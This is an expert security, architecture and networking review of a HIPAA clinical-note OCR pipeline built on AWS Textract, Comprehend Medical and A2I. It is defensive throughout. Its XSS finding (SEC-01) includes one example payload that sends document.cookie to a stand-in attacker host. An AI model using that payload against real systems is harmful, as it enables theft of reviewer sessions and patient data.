# Expert Review: Recipe 1.6 -- Handwritten Clinical Note Digitization

**Reviewed by:** Technical Expert Panel (Security, Architecture, Networking)
**Recipe complexity:** Complex / Phase 3
**Review date:** 2026-03-05
**Scope:** A2I security and workforce PHI access, task template injection risks, confidence-tiered pipeline architecture, async human loop failure modes, HIPAA implications of human review workflows, and networking for the A2I + Textract + Comprehend Medical stack.

---

## Overall Assessment

Recipe 1.6 is the most operationally mature recipe in Chapter 1. The confidence-tiering model is well-reasoned, the Standard Workflow choice for Step Functions is correct, and the three-tier routing design handles the core accuracy tradeoff honestly. The "Honest Take" section is genuinely good writing.

That said, the recipe has several security gaps that are consequential in a HIPAA context -- not hypothetical edge cases. The XSS vector in the worker task template is the most acute. The pre-signed URL lifetime mismatch and the worker ID labeling issue both require correction before production deployment. On the architecture side, the human loop name collision risk and the missing DLQ on the resume Lambda are operational landmines. Networking is adequately covered at the prerequisites level but needs one critical addition: VPC endpoints for the A2I (SageMaker) control plane are missing from the endpoint list.

Each issue below includes a severity rating (Critical / High / Medium / Low) and a concrete fix.

---

## Security Review

### SEC-01 [Critical] -- XSS Injection via OCR Output in Worker Task Template

**The problem.** The task template injects `entity.text` directly into an HTML attribute with no explicit escaping:

```html
<crowd-input
  name="corrected_text_{{ entity.id }}"
  value="{{ entity.text }}"
  required>
</crowd-input>
```

`entity.text` is OCR output from a handwritten clinical note. Textract reads whatever is on the page. A document containing a string that looks like `"><img src=x onerror=fetch('https://attacker.com/'+document.cookie)>` would be read by Textract and injected verbatim into the rendered HTML served to reviewers in the A2I worker portal. The A2I worker portal runs inside a Cognito-authenticated browser session. Session cookies, task metadata, and any PHI displayed on the page are in scope for exfiltration.

The chapter's pseudocode note acknowledges that "Reviewers are not engineers. The interface should require minimal explanation." That framing is correct -- but it means reviewers will not notice when the interface behaves unexpectedly.

A2I's Liquid template rendering does perform default HTML escaping for `{{ variable }}` output in most contexts, but it does NOT escape inside HTML attribute values when the attribute is not quoted with a specific HTML-safe filter. The `value=` attribute without the `| escape` filter is the gap.

**Fix.** Apply the HTML escape filter explicitly on all OCR-derived values in the template:

```html
<crowd-input
  name="corrected_text_{{ entity.id | escape }}"
  value="{{ entity.text | escape }}"
  required>
</crowd-input>
```

Apply `| escape` to every template variable that originates from OCR output or Comprehend Medical extraction (entity.text, entity.category, entity.ocr_confidence display values). Variables from your own structured code (entity.id, entity.category when from a controlled enum) are lower risk but should be escaped as a matter of hygiene.

Add a Content-Security-Policy header to the task template's meta section:

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; img-src 'self' https://*.s3.amazonaws.com; script-src 'self' https://assets.crowd.aws;">
```

This limits what injected scripts can load even if an escape is missed.

---

### SEC-02 [High] -- Pre-Signed URL Lifetime Shorter Than Realistic Review Queue Depth

**The problem.** Step 5 creates a pre-signed URL with `expiry=4_hours` and embeds it in the A2I task input:

```python
document_image_uri: get_presigned_url(document_key, expiry=4_hours)
```

The recipe correctly notes that "A2I human reviews can take minutes, hours, or longer depending on queue depth and reviewer availability." The expected end-to-end latency for the human review path is "30 minutes to 4 hours." In practice, if the review queue is deep (a common scenario after a batch ingest or a weekend backlog), tasks sit unassigned for longer than 4 hours. When a reviewer opens the task, the pre-signed URL has expired and the document image is a broken link. The reviewer cannot complete the review. The Step Functions execution stays suspended until the heartbeat timeout fires.

This is not a hypothetical. Any deployment that processes documents outside business hours will hit this regularly.

**Fix.** Set the pre-signed URL expiry to match the maximum expected task assignment delay plus review time. A pragmatic default for healthcare reviewer queues is 24-48 hours:

```python
document_image_uri: get_presigned_url(document_key, expiry=48_hours)
```

If the 48-hour window is wider than your security policy allows for PHI image access, use a Lambda authorizer pattern instead: store only the S3 key in the task input, and add a small proxy Lambda behind API Gateway that validates the reviewer's Cognito JWT, checks that they are assigned to the corresponding human loop, and generates a fresh short-lived pre-signed URL on demand. This eliminates the lifetime problem entirely and adds reviewer-to-document access binding.

Also add a note to the review-output bucket policy restricting PUT access to the A2I service principal only, so the URL embedded in task inputs cannot be used to write to the output bucket.

---

### SEC-03 [High] -- Worker ID Stored as "Anonymized" When It Is Not

**The problem.** Step 7's pseudocode stores the reviewer identifier with a misleading comment:

```python
reviewer_id: review_data.humanAnswers[0].workerId   // anonymized
```

A2I worker IDs are NOT automatically anonymized. They are internal identifiers assigned by the A2I service, but they are consistent across tasks and can be correlated with your Cognito user pool to identify the specific reviewer. Storing a per-entity reviewer identifier alongside the entity's corrected clinical text (medication names, diagnoses, dosages) in DynamoDB creates a record that links a named individual to specific PHI correction actions.

Under HIPAA, a workforce member's access to specific PHI is itself sensitive information. It must be covered by your organization's BAA with AWS, protected at rest, and subject to your breach notification obligations. None of that is wrong here given that the workforce is private and Cognito-authenticated, but the comment "// anonymized" is factually incorrect and will mislead downstream engineers who rely on that comment to make access control decisions.

**Fix.** Remove the misleading comment. Replace it with accurate guidance:

```python
# workerId is the A2I-assigned worker identifier.
# It can be correlated with Cognito user records.
# Treat as PHI-adjacent: protect under the same controls as entity data.
# Do not expose in public APIs, logs, or analytics without de-identification.
reviewer_id: review_data.humanAnswers[0].workerId
```

If your organization's policy requires genuine de-identification of reviewer identity in the extraction record (e.g., to prevent internal access audits from being too granular), generate a pseudonymous reviewer token at write time: hash the workerId with a per-deployment HMAC key stored in Secrets Manager. This preserves auditability (same reviewer across sessions has the same token) without exposing the raw A2I identifier.

Separately, add an explicit note to the prerequisites table: "DynamoDB completed-extractions table must be accessible only to authorized clinical staff, not to general analytics pipelines, because records contain reviewer identity linked to PHI corrections."

---

### SEC-04 [High] -- No MFA Requirement or Session Timeout Policy on Cognito Workforce Authentication

**The problem.** The prerequisites mention "authenticated through an identity provider you control" and "HIPAA training as a prerequisite." The A2I private workforce setup section references Cognito user pool groups. But neither the prerequisites table nor the implementation notes specify:

- MFA enforcement on the Cognito user pool
- Session token lifetime (Cognito's default access token lifetime is 1 hour, refresh token lifetime is 30 days)
- Session invalidation when a reviewer's employment ends
- Concurrent session limits

The A2I worker portal presents PHI (clinical note images with medical entities) in the browser. An unattended reviewer session is an open PHI access window. HIPAA's Technical Safeguard requirement for automatic logoff (45 CFR 164.312(a)(2)(iii)) applies here.

**Fix.** Add the following to the prerequisites table under "A2I Workforce":

- Cognito user pool must have MFA required (not optional) for all workers. SMS MFA is acceptable; TOTP is preferred.
- Cognito access token lifetime: set to 15-30 minutes (align with your organization's session timeout policy).
- Cognito refresh token lifetime: set to 8 hours maximum (one shift).
- Add a Cognito Lambda trigger on `PreTokenGeneration` that checks a "reviewer_active" flag in DynamoDB before issuing tokens, so terminated reviewers are blocked immediately without waiting for token expiry.
- The A2I worker portal does not natively enforce automatic logoff; document that reviewers must be trained to close the portal when stepping away, and that the session timeout on the access token is the backstop control.

In the architecture section, add one sentence: "The Cognito user pool must enforce MFA and short-lived access tokens; the default 30-day refresh token lifetime is inappropriate for a PHI-handling workforce portal."

---

### SEC-05 [Medium] -- Document Image Delivered to Reviewers via Public S3 Pre-Signed URL Over Public Internet

**The problem.** The reviewer sees the clinical note image via a pre-signed S3 URL rendered in their browser. Pre-signed URLs for SSE-KMS encrypted objects work over public S3 endpoints -- there is no way to restrict pre-signed URL resolution to VPC endpoints. This means that even if every Lambda in the pipeline is running inside a VPC with private endpoints, the document images are delivered to reviewer browsers over the public internet. Browser history, corporate proxy logs, and network captures on the reviewer's machine can contain the URL (and by extension, the image content) for the duration of the pre-signed URL lifetime.

This is an inherent limitation of how pre-signed URLs work, and it is not unique to this recipe. But the recipe does not disclose it.

**Fix.** Add a disclosure note in the prerequisites table under "Encryption":

"Pre-signed S3 URLs used to deliver document images to A2I reviewers resolve over public S3 HTTPS endpoints regardless of VPC configuration. This is an inherent characteristic of pre-signed URLs. Mitigations: (1) use the shortest practical URL lifetime, (2) ensure reviewer workstations are on a managed corporate network with endpoint protection and proxy logging, (3) consider the Lambda proxy approach (see SEC-02) to scope URL validity to the authenticated reviewer's session."

If the organization requires that PHI never traverse public internet endpoints under any circumstances, the Lambda proxy approach from SEC-02 is the architectural solution. The proxy can return the image data as a response body (inline) rather than redirecting to S3, keeping the data flow inside the VPC.

---

### SEC-06 [Medium] -- Task Token Embedded in A2I HumanLoopInput Is a Step Functions Execution Credential

**The problem.** The task token that allows Step Functions execution resumption is passed as plaintext inside the A2I `HumanLoopInput` JSON, which A2I then writes to S3 as part of the review output. This means the task token lives in:

1. The A2I `HumanLoopInput` (accessible via `DescribeHumanLoop` API)
2. The review output JSON file in S3

The task token is not PHI, but it IS a capability: anyone who can call `StepFunctions.SendTaskSuccess` with a valid token can resume -- and manipulate the output of -- the corresponding pipeline execution. Access to the review-output bucket must therefore be treated as equivalent to execution-control access on the Step Functions pipeline.

**Fix.** Add to the prerequisites table under "IAM Permissions":

"The S3 review-output bucket policy must restrict `s3:PutObject` to the A2I service principal (`sagemaker.amazonaws.com`) and `s3:GetObject` to the resume Lambda's execution role only. No human IAM principals should have direct read access to this bucket. The task token should not appear in CloudWatch Logs; ensure the resume Lambda's logging does not print the full review output JSON."

In the Step 5 pseudocode, add a comment:

```python
# Task token grants execution control over this Step Functions run.
# The review-output bucket containing this token must be tightly scoped:
# A2I service principal for writes, resume Lambda role for reads only.
```

---

## Architecture Review

### ARCH-01 [Critical] -- Human Loop Name Collision on Document Reprocessing

**The problem.** The A2I human loop name is constructed as:

```python
HumanLoopName: "note-review-" + hash(document_key)
```

A2I requires human loop names to be unique within a flow definition. They cannot be reused. If the same document is reprocessed (a common operational scenario: a reviewer identified an error in the merged result, a file was re-uploaded after a processing failure, or a Step Functions execution was retried after a Lambda error), `StartHumanLoop` will return a `ConflictException`. The Step Functions execution will fail at the A2I step, and the error may not be obvious from the execution history.

This is especially likely during the first weeks of production when operators are still debugging the pipeline and manual retries are frequent.

**Fix.** Include the Step Functions execution ID in the loop name to guarantee uniqueness:

```python
# Include execution ID to allow reprocessing the same document.
# A2I requires globally unique HumanLoopName per flow definition.
loop_name_source = document_key + "|" + step_functions_execution_id
HumanLoopName: "note-review-" + sha256(loop_name_source)[:32]
```

Add this explanation as an inline comment in the pseudocode. Also add a Step Functions retry configuration on the A2I state that does NOT retry on `ConflictException` (which indicates a programming error) but DOES retry on `ServiceUnavailableException` and `ThrottlingException` with exponential backoff.

---

### ARCH-02 [High] -- No Dead Letter Queue on the Resume Lambda; Executions Hang Silently

**The problem.** The recipe acknowledges the risk: "if the Lambda that sends `SendTaskSuccess` itself fails...the Step Functions execution stays suspended indefinitely." The recommended mitigation is a heartbeat timeout of 8 hours. That is necessary but not sufficient.

An 8-hour heartbeat timeout means: if the resume Lambda fails at 9am, the Step Functions execution does not surface as failed until 5pm. In a healthcare workflow where the reviewed extractions are needed to fulfill a prior auth request or process a claims attachment, 8 hours of silent failure is unacceptable.

The resume Lambda failure modes are not exotic: an S3 read error on the review output file, a DynamoDB throttle, a malformed review output from a future A2I format change, or a cold-start timeout if the Lambda has been idle. These are normal Lambda failure scenarios.

**Fix.** Configure a Dead Letter Queue (DLQ) on the resume Lambda using an SQS queue:

```python
# In Lambda configuration (CDK/CloudFormation):
resume_lambda.add_dead_letter_queue(
    queue=sqs.Queue(self, "ReviewResumeDLQ",
        encryption=sqs.QueueEncryption.KMS_MANAGED,
        retention_period=Duration.days(14)
    )
)
```

Create a CloudWatch alarm on the DLQ's `ApproximateNumberOfMessagesVisible` metric with a threshold of 1 and a notification to your oncall SNS topic. This surfaces failed resumes within the CloudWatch alarm evaluation period (typically 1-5 minutes) rather than 8 hours.

Separately, reduce the heartbeat timeout recommendation to 2 hours. Eight hours matches the outer boundary of A2I task completion time, but if the heartbeat is missing for 2 hours, something is wrong independent of normal reviewer delay. The DLQ alarm is the fast-path detector; the heartbeat timeout is the backstop.

Add this to "The Honest Take":

"Set a DLQ on the resume Lambda. The heartbeat timeout catches stuck executions eventually; the DLQ catches the failure at the source. Both are needed."

---

### ARCH-03 [High] -- `find_words_matching_text` Is a Load-Bearing Undefined Function

**The problem.** Step 3 contains:

```python
matching_words = find_words_matching_text(handwritten_words, entity_text)
```

This function is called a "straightforward" step, but it is actually the most error-prone function in the entire pipeline. Comprehend Medical extracts entities based on character offsets in the full text string. Textract returns word-level bounding boxes based on layout in the image. Mapping between them requires:

1. Reconstructing the Textract character offset for each word in the full text (accounting for line breaks, multi-word tokens, and any whitespace normalization that happened during LINE-block joining).
2. Fuzzy-matching entity text against word text (because Comprehend Medical may normalize case or whitespace differently from Textract).
3. Handling multi-word entities that span line boundaries (the entity "Type 2 diabetes mellitus" may span two Textract LINE blocks).

A naive implementation that does string matching against `handwritten_words` will produce incorrect `ocr_confidence` values whenever:
- An entity contains whitespace that was normalized differently
- An entity spans a line break
- The same string appears more than once on the page

If this function returns empty for a multi-word medication entity, the code falls through to `ocr_confidence = 90.0` (the "no handwritten match" default), which incorrectly assigns high confidence to a potentially low-confidence handwritten entity. That entity may skip human review when it should not.

**Fix.** Expand the pseudocode for `find_words_matching_text` into a full implementation sketch:

```python
FUNCTION find_words_matching_text(handwritten_words, entity_text, full_text, entity_begin_offset):
    # entity_begin_offset: character offset from ComprehendMedical response (entity.BeginOffset)
    # Reconstruct each word's character offset within full_text by tracking
    # running character position during LINE block assembly.

    entity_end_offset = entity_begin_offset + len(entity_text)
    matching_words = []

    FOR each word in handwritten_words:
        # word.char_begin and word.char_end set during LINE reconstruction step
        IF word.char_begin < entity_end_offset AND word.char_end > entity_begin_offset:
            append word to matching_words

    RETURN matching_words
```

This requires adding character offset tracking during the LINE block reconstruction in Step 2. Add a note:

"Compute character offsets for each word during Textract LINE block assembly, not retroactively. Store `char_begin` and `char_end` on each word object. These are required for accurate OCR-to-NLP entity matching."

Also add a footnote warning: "The `ocr_confidence = 90.0` fallback for unmatched entities should never be reached for handwritten entities. Log a warning and route the entity to human review if no matching words are found for an entity the NLP extracted from a handwritten region."

---

### ARCH-04 [Medium] -- No Handling for Zero Available Reviewers in the Private Workforce

**The problem.** `StartHumanLoop` succeeds as long as the flow definition is valid and the workforce exists. If no reviewers are available (outside business hours, after a holiday, during a staffing gap), the human loop is created and sits in the queue indefinitely. The Step Functions execution is suspended at the A2I wait state, consuming an execution slot. At scale, a weekend batch ingest could create hundreds of suspended executions. When reviewers log in Monday morning, the queue depth may exceed their practical capacity for the day.

The recipe mentions queue depth monitoring ("CloudWatch: review queue depth") but does not address the upstream throttle: the rate at which documents are routed to human review.

**Fix.** Add two controls:

First, a queue depth alarm with backpressure. Create a CloudWatch alarm on the A2I `HumanLoopsPending` metric. When the alarm fires (threshold: more than 2x expected daily review capacity), the `route_entities` Lambda should write low-confidence entities to a holding table in DynamoDB instead of immediately calling `StartHumanLoop`. A scheduled EventBridge rule drains the holding table into A2I at a controlled rate based on reviewer capacity.

Second, a workforce availability check before routing. A2I does not expose a "reviewers online" API, but you can proxy this by tracking reviewer last-activity timestamps via the Cognito `ListUsers` API (last sign-in time). Document that a workforce availability SLA (e.g., "at least one reviewer online during business hours") must be established and monitored, and that batch ingests outside business hours should be rate-limited or deferred.

---

### ARCH-05 [Medium] -- DynamoDB Conditional Write Mentioned but Never Implemented

**The problem.** The prerequisites table states: "DynamoDB's conditional writes let the result-merge Lambda safely assemble the final record from parts that arrive at different times." This is good reasoning. The implementation in Step 8 (`write to DynamoDB table "completed-extractions"`) has no condition expression, making it an unconditional overwrite. If the merge Lambda is invoked twice (Lambda retries on a transient error, or a duplicate S3 event fires the resume Lambda), the second invocation silently overwrites the first, potentially with a partial result set.

**Fix.** Add a condition expression to the final record write:

```python
write to DynamoDB table "completed-extractions":
    pk: document_key
    ...
    condition: attribute_not_exists(pk)   # fail if record already exists

# On ConditionalCheckFailedException: log a warning and exit.
# The record was already written by a prior invocation; this is idempotent.
```

For the intermediate entity writes in Steps 5 and 7, use `attribute_not_exists(sk)` as the condition on the entity sort key. This makes all DynamoDB writes idempotent and safe under Lambda retry semantics.

---

### ARCH-06 [Low] -- Training Data Partition Key Lacks Document Source Metadata

**The problem.** Training pairs are written to S3 with the partition `training-data/{date}/{uuid}.json`. For future model fine-tuning, date partitioning is correct. But the training data capture is missing the document source (provider ID, document type, intake channel). When you go to train a custom Textract adapter for a specific document population (the recipe's Variation: Custom Textract Adapter), you need to filter training data by document type. Without source metadata, you cannot distinguish training pairs from "cardiology handwritten progress notes" versus "pharmacy fax cover sheets" versus "authorization forms."

**Fix.** Partition by document type and source in addition to date:

```python
s3_key = "training-data/{date}/{doc_type}/{source_id}/{uuid}.json"
```

Add `doc_type` and `source_id` to each training pair object. If this metadata is not available at processing time, add it as an enrichment step during the pre-process Lambda by inferring document type from the intake S3 key prefix convention (e.g., `notes-intake/{provider_id}/{doc_type}/`).

---

## Networking Review

### NET-01 [Critical] -- A2I (SageMaker) VPC Endpoint Missing from the Endpoint List

**The problem.** The prerequisites table's VPC section lists VPC endpoints for S3, Textract, Comprehend Medical, DynamoDB, and CloudWatch Logs, with Step Functions noted as "optional but recommended." Amazon A2I uses the SageMaker API endpoint (`sagemaker.{region}.amazonaws.com`). When the `route_entities` Lambda (which calls `StartHumanLoop`) and the resume Lambda (which does not call SageMaker directly, but may need to call `DescribeHumanLoop` for status checks) run inside a VPC, their calls to the A2I/SageMaker API travel over the public internet via NAT Gateway unless a VPC endpoint for SageMaker is configured.

For a HIPAA workload, API calls that include PHI-adjacent metadata (document keys, task tokens, human loop names that encode document keys) should not traverse public internet paths.

`StartHumanLoop` does not send document content directly to the SageMaker API (the document image remains in S3), but the `HumanLoopInput` JSON does contain the pre-signed URL and entity text. In the current design, entity text (medication names, diagnoses) is in the `HumanLoopInput`. That is PHI traveling in an API call that currently goes over public internet when Lambdas are in a VPC without the SageMaker endpoint.

**Fix.** Add to the prerequisites VPC section:

"**SageMaker/A2I VPC Endpoint (com.amazonaws.{region}.sagemaker.api):** Required. Lambdas that call `StartHumanLoop`, `DescribeHumanLoop`, or `StopHumanLoop` must reach the A2I/SageMaker API via a VPC endpoint, not NAT Gateway. The SageMaker API endpoint supports Interface endpoints (PrivateLink)."

Update the endpoint list:

| Endpoint | Type | Required | Notes |
|----------|------|----------|-------|
| com.amazonaws.{region}.s3 | Gateway | Required | Intake, enhanced, review-output, training-data buckets |
| com.amazonaws.{region}.textract | Interface | Required | AnalyzeDocument calls |
| com.amazonaws.{region}.comprehendmedical | Interface | Required | DetectEntitiesV2 calls |
| com.amazonaws.{region}.dynamodb | Gateway | Required | All entity and result tables |
| com.amazonaws.{region}.sagemaker.api | Interface | Required | StartHumanLoop, DescribeHumanLoop |
| com.amazonaws.{region}.states | Interface | Required | StartExecution, SendTaskSuccess |
| com.amazonaws.{region}.kms | Interface | Required | SSE-KMS key operations from within VPC |
| com.amazonaws.{region}.logs | Interface | Required | CloudWatch Logs from Lambda |
| com.amazonaws.{region}.monitoring | Interface | Recommended | CloudWatch metrics |

---

### NET-02 [High] -- KMS VPC Endpoint Missing; SSE-KMS Operations Will Use NAT

**The problem.** All S3 buckets and DynamoDB tables use SSE-KMS encryption, which is correct. However, every SSE-KMS operation (S3 PutObject, S3 GetObject, DynamoDB PutItem, DynamoDB GetItem) requires a call to the KMS API to encrypt or decrypt the data key. When Lambda functions run inside a VPC, KMS API calls go through NAT Gateway unless a `com.amazonaws.{region}.kms` Interface endpoint is present.

This has two consequences for a HIPAA pipeline:
1. Every read and write of PHI from encrypted storage involves a call that crosses the public internet path (NAT).
2. KMS API calls are billed per call; at scale, the NAT Gateway data processing charge plus KMS throttling risk add up.

**Fix.** Add `com.amazonaws.{region}.kms` to the required VPC endpoint list (see NET-01 table above). This is an Interface endpoint (PrivateLink). Add a note:

"KMS endpoint is required, not optional, when using SSE-KMS on S3 or DynamoDB from within a VPC. Without it, every encrypted read/write from Lambda calls KMS over public NAT, which routes PHI-related key operations outside the VPC."

---

### NET-03 [High] -- Step Functions VPC Endpoint Listed as "Optional but Recommended"; Should Be Required

**The problem.** The prerequisites note: "Step Functions VPC endpoint optional but recommended." For this pipeline, the Lambda that sends `SendTaskSuccess` runs inside the VPC and calls `states.{region}.amazonaws.com`. Without a VPC endpoint, this call goes over NAT. The `SendTaskSuccess` payload includes the `document_key` and processing metadata. The task token itself is also transmitted. These are not PHI, but the execution context is PHI-adjacent and the call should stay inside the VPC boundary.

Additionally, the `start-workflow` Lambda (triggered by S3 event, calls `states:StartExecution`) passes the S3 key of the clinical note as the execution input. That S3 key is in the execution input and appears in the CloudTrail event for `StartExecution`. It should not transit NAT.

**Fix.** Change the prerequisites note from "optional but recommended" to required for HIPAA deployments. Update the endpoint table in NET-01 accordingly.

---

### NET-04 [Medium] -- No Regional Co-location Requirement for Textract, Comprehend Medical, and A2I

**The problem.** The pipeline calls three managed AI services: Textract, Comprehend Medical, and A2I (SageMaker). Each must be called in the same AWS region where the data resides (for PHI, cross-region data transfer is a HIPAA concern that requires explicit BAA coverage and risk assessment). The recipe does not state this constraint. A developer who sees that Comprehend Medical is not available in their preferred region (it has limited regional availability) might attempt to call Comprehend Medical in a different region while keeping data in their primary region.

**Fix.** Add to the prerequisites table:

"**Region:** All services (Textract, Comprehend Medical, A2I, Step Functions, Lambda, S3, DynamoDB, KMS) must be deployed in the same AWS region. PHI must not be transmitted cross-region without explicit risk assessment and BAA review. If Comprehend Medical is not available in your target region, deploy all pipeline components in a region where it is available. Verify current regional availability at the AWS Regional Services List before deployment."

---

### NET-05 [Low] -- Comprehend Medical 20KB Per-Request Limit Not Disclosed

**The problem.** `ComprehendMedical.DetectEntitiesV2` has a per-request limit of 20,000 bytes (UTF-8 encoded). The recipe sends the full text of a clinical note as a single request. A one-page note is typically within this limit (roughly 2,000-4,000 characters). A multi-page note or a lengthy consultation letter can exceed it.

The recipe's architecture diagram and pseudocode send `full_text` as a single call. If the text exceeds 20KB, the API returns a `TextSizeLimitExceededException` and the Lambda fails. The Step Functions execution does not have error handling defined for this state.

**Fix.** Add text segmentation logic to the Comprehend Medical call in Step 3:

```python
FUNCTION extract_clinical_entities(full_text, handwritten_words):
    MAX_BYTES = 19000   # safety margin below 20KB limit

    # Segment full_text into chunks at sentence/line boundaries.
    # Track cumulative character offset to map entity positions
    # back to the original full_text for bounding box correlation.
    text_segments = segment_text(full_text, max_bytes=MAX_BYTES)
    all_entities = []
    cumulative_offset = 0

    FOR each segment in text_segments:
        response = call ComprehendMedical.DetectEntitiesV2(text=segment)
        FOR each entity in response.Entities:
            # Adjust offsets to be relative to full_text, not the segment
            entity.BeginOffset += cumulative_offset
            entity.EndOffset   += cumulative_offset
            append entity to all_entities
        cumulative_offset += len(segment)

    # Continue with enrichment as before...
```

Add a note: "Split text at paragraph or sentence boundaries to preserve entity context. Do not split mid-sentence; Comprehend Medical entity detection degrades when a sentence is truncated at a chunk boundary."

---

## Minor Issues

**M-01 [Low]** -- The `processing_time_seconds: 2284` in the sample output (38 minutes) is within the stated range but sits at the upper bound of normal human review time. Consider adding a note explaining what drove that specific duration (e.g., "reviewer picked up the task 35 minutes after it was queued; actual review took 3 minutes") so readers understand the latency distribution.

**M-02 [Low]** -- The task template uses `{% for entity in task.input.entities_to_review %}`. If `entities_to_review` is large (a page with many low-confidence entities), the rendered template can become unwieldy for reviewers. Consider adding a note recommending a maximum of 15-20 entities per task; split larger task inputs into multiple sequential A2I tasks with a clear "page X of Y" indicator.

**M-03 [Low]** -- The recipe correctly notes that `WorkflowType: Standard` is required for executions longer than 5 minutes. Consider adding the explicit execution duration limit for Standard Workflows (1 year) and the concurrent execution quota (default 1,000 per account, soft limit). For a high-volume deployment processing hundreds of notes per day with 4-hour review windows, concurrent execution counts deserve a capacity planning note.

**M-04 [Low]** -- "The ISMP's list of dangerous abbreviations reads like a catalog of things a tired handwriting recognition system might confuse" is an excellent sentence. The ISMP reference should be a footnote with a URL for readers who want to review the actual list.

---

## Summary of Issues by Severity

| ID | Severity | Area | Title |
|----|----------|------|-------|
| SEC-01 | Critical | Security | XSS injection via OCR output in worker task template |
| ARCH-01 | Critical | Architecture | Human loop name collision on document reprocessing |
| SEC-02 | High | Security | Pre-signed URL lifetime shorter than realistic queue depth |
| SEC-03 | High | Security | Worker ID labeled "anonymized" when it is not |
| SEC-04 | High | Security | No MFA requirement or session timeout on Cognito workforce |
| NET-01 | Critical | Networking | A2I/SageMaker VPC endpoint missing from endpoint list |
| NET-02 | High | Networking | KMS VPC endpoint missing; SSE-KMS uses NAT |
| NET-03 | High | Networking | Step Functions VPC endpoint listed optional; should be required |
| ARCH-02 | High | Architecture | No DLQ on resume Lambda; executions hang silently |
| ARCH-03 | High | Architecture | `find_words_matching_text` is load-bearing and undefined |
| ARCH-04 | Medium | Architecture | No handling for zero available reviewers |
| ARCH-05 | Medium | Architecture | DynamoDB conditional writes mentioned but not implemented |
| SEC-05 | Medium | Security | PHI images delivered via public S3 pre-signed URL |
| SEC-06 | Medium | Security | Task token embedded in A2I input is an execution credential |
| NET-04 | Medium | Networking | No regional co-location requirement stated |
| NET-05 | Low | Networking | Comprehend Medical 20KB limit not disclosed |
| ARCH-06 | Low | Architecture | Training data lacks document source metadata for adapter training |
| M-01 through M-04 | Low | Various | Minor prose and completeness items |

---

## Recommended Revisions (Priority Order)

1. **Fix the XSS vector (SEC-01) before any other change.** Add `| escape` to all OCR-derived template variables and add a CSP meta tag. This is a 5-minute code change with significant security impact.

2. **Add SageMaker and KMS to the VPC endpoint list (NET-01, NET-02).** Update the prerequisites table. PHI is currently transiting NAT for A2I API calls and KMS operations.

3. **Fix the human loop name collision (ARCH-01).** Include the Step Functions execution ID in the loop name. This will cause silent failures in production during any reprocessing scenario.

4. **Correct the worker ID comment (SEC-03) and add MFA requirement (SEC-04).** These are documentation changes that prevent downstream engineers from making incorrect PHI handling decisions.

5. **Add the DLQ to the resume Lambda (ARCH-02) and expand `find_words_matching_text` (ARCH-03).** Both are operational reliability fixes.

6. **Extend pre-signed URL lifetime or adopt the proxy approach (SEC-02).** This will affect every deployment that runs review queues outside business hours, which is most of them.

---

*Review complete. The recipe is structurally sound and the design decisions are defensible. The issues above are concentrated in the A2I integration layer, which is the newest and most operationally complex part of the stack. Addressing the Critical and High items brings this recipe to a production-ready security baseline.*
